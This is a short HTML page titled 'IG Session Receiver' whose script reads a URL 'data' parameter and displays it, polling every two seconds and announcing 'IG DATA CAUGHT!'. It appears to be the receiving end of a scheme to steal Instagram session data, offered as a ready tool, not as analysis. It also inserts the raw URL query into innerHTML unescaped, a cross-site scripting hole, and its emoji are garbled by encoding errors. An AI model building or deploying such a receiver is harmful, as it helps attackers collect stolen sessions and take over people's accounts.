<!DOCTYPE html><html><head><title>IG Receiver</title></head><body style="font-family:monospace;background:#000;color:lime;padding:20px;">
<h2>üïµÔ∏è IG Session Receiver - LIVE</h2>
<div id="status">Ready for data...</div>
<pre id="log">Send data ‚Üí appears here instantly!</pre>

<script>
function checkData() {
    const urlParams = new URLSearchParams(window.location.search);
    const data = urlParams.get('data');
    if(data) {
        try {
            const parsed = JSON.parse(decodeURIComponent(data));
            document.getElementById('log').textContent = JSON.stringify(parsed, null, 2);
            document.getElementById('status').innerHTML = `‚úÖ LIVE DATA (${new Date().toLocaleTimeString()})`;
            document.title = 'IG DATA CAUGHT!';
        } catch(e) {
            document.getElementById('log').textContent = decodeURIComponent(data);
            document.getElementById('status').innerHTML = '‚úÖ RAW DATA RECEIVED';
        }
    }
}

// Check on load + every 2s
checkData();
setInterval(checkData, 2000);

// Debug: Show current URL params
document.getElementById('status').innerHTML += ` | URL: ${window.location.search}`;
</script>
</body></html>
